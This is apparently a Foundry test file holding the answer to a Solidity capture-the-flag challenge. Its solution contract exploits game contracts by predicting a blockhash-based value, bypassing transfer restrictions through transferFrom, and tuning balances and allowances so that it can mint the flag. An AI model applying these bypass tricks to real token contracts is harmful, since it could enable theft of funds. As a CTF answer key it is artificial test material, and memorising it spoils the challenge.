// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {BaseTest} from "../BaseTest.sol";
import {
    Season2Challenge12,
    Season2Challenge12Inventory,
    Season2Challenge12Quest,
    Season2Challenge12Dungeon,
    Season2Challenge12Victory,
    Season2Challenge12GoldToken,
    Season2Challenge12HeroNFT
} from "../../../src/season2/Season2Challenge12.sol";

contract Challenge12Solution {
    Season2Challenge12 challenge;
    Season2Challenge12Inventory inventory;
    Season2Challenge12Quest quest;
    Season2Challenge12Dungeon dungeon;
    Season2Challenge12Victory victory;
    Season2Challenge12GoldToken gold;
    Season2Challenge12HeroNFT hero;

    constructor(
        Season2Challenge12 _challenge,
        Season2Challenge12Inventory _inventory,
        Season2Challenge12Quest _quest,
        Season2Challenge12Dungeon _dungeon,
        Season2Challenge12Victory _victory,
        Season2Challenge12GoldToken _gold,
        Season2Challenge12HeroNFT _hero
    ) {
        challenge = _challenge;
        inventory = _inventory;
        quest = _quest;
        dungeon = _dungeon;
        victory = _victory;
        gold = _gold;
        hero = _hero;
    }

    function solve() external {
        // 1. Become a winner
        // Set position to > 0 so dungeon[tx.origin] > 0
        dungeon.setPosition(bytes32(uint256(1)));
        // Set victory to true
        victory.free(true);

        // 2. Mint Hero NFT with URI "5"
        // stringToUint("5") -> 0x35 - 0x35 = 0
        // This ensures the inventory value will be set to 0
        uint256 tokenId = hero.mint("5");

        // 3. Prepare Math
        // Calculate the hash required by the contract
        // inventoryValue will be 0 (from URI "5")
        bytes32 hash = keccak256(abi.encodePacked(blockhash(block.number - 1), address(challenge), uint256(0)));

        // H is the required balance of this contract at the moment of the check
        uint256 H = uint256(hash) % 100 ether;

        // 4. Manipulate Balances
        // We need:
        // - Final Solution Balance == H
        // - Enemy Balance >= 1 ether (for 'rich' modifier)
        // - Player Balance == Enemy Balance

        // We use an arbitrary amount for the side balances
        uint256 sideBalance = 1 ether;

        // Target Start Balance for Solution = H + 1 ether (to cover the transferFrom fee in mintFlag)
        uint256 targetStartBalance = H + 1 ether;

        address enemy = address(~bytes20(tx.origin));

        // Approve ourselves to allow transferFrom (to bypass the restrictions in the overridden transfer())
        gold.approve(address(this), type(uint256).max);

        // Fund Enemy
        gold.transferFrom(address(this), enemy, sideBalance);

        // Fund Player (tx.origin)
        gold.transferFrom(address(this), tx.origin, sideBalance);

        // Burn remaining tokens until our balance is exactly what's needed
        uint256 currentBalance = gold.balanceOf(address(this));
        require(currentBalance >= targetStartBalance, "Not enough gold");
        if (currentBalance > targetStartBalance) {
            gold.burn(currentBalance - targetStartBalance);
        }

        // 5. Match Dungeon Position
        // require(balance == Quest.quest * Dungeon.dungeon)
        // balance will be H.
        quest.setCurrentQuest(1);
        dungeon.setPosition(bytes32(H));

        // 6. Allowance
        // The challenge contract calls transferFrom(msg.sender, address(this), 1 ether) at the start.
        // It later checks if allowance == inventory (which is 0).
        // Since transferFrom consumes allowance, we approve exactly 1 ether.
        // After the transfer, the remaining allowance will be 0, satisfying the check.
        gold.approve(address(challenge), 1 ether);

        // 7. Execute
        challenge.mintFlag(tokenId);
    }
}

contract Challenge12Test is BaseTest {
    Season2Challenge12 challenge12;
    Season2Challenge12Inventory inventory;
    Season2Challenge12Quest quest;
    Season2Challenge12Dungeon dungeon;
    Season2Challenge12Victory victory;
    Season2Challenge12GoldToken gold;
    Season2Challenge12HeroNFT hero;

    function setUp() public {
        setUpChallenges();

        vm.startPrank(ADMIN);

        // Deploy Ecosystem
        inventory = new Season2Challenge12Inventory();
        quest = new Season2Challenge12Quest();
        dungeon = new Season2Challenge12Dungeon(address(quest));
        victory = new Season2Challenge12Victory(address(dungeon));
        hero = new Season2Challenge12HeroNFT();
        gold = new Season2Challenge12GoldToken(address(hero), address(dungeon), address(nftFlags));

        challenge12 = new Season2Challenge12(
            address(nftFlags),
            address(inventory),
            address(quest),
            address(dungeon),
            address(victory),
            address(gold),
            address(hero)
        );

        // Setup permissions
        nftFlags.addAllowedMinter(address(challenge12));
        nftFlags.setGoldTokenAddress(address(gold));
        inventory.transferOwnership(address(challenge12));

        vm.stopPrank();
    }

    function test_challenge12() public {
        vm.startPrank(PLAYER, PLAYER);

        // Prerequisite: Get Gold Tokens
        vm.stopPrank();
        vm.prank(address(nftFlags));
        gold.mint(PLAYER); // Gives 1000 * 10**18 to PLAYER
        vm.startPrank(PLAYER, PLAYER);

        // Deploy Solution
        Challenge12Solution solution =
            new Challenge12Solution(challenge12, inventory, quest, dungeon, victory, gold, hero);

        // Transfer Gold to solution so it can operate
        // Using transferFrom to bypass restrictions in transfer()
        gold.approve(PLAYER, type(uint256).max);
        gold.transferFrom(PLAYER, address(solution), gold.balanceOf(PLAYER));

        // Execute Solution
        solution.solve();

        // DONE: You should have obtained the flag for challenge #12
        assertTrue(nftFlags.hasMinted(PLAYER, 12));
    }
}
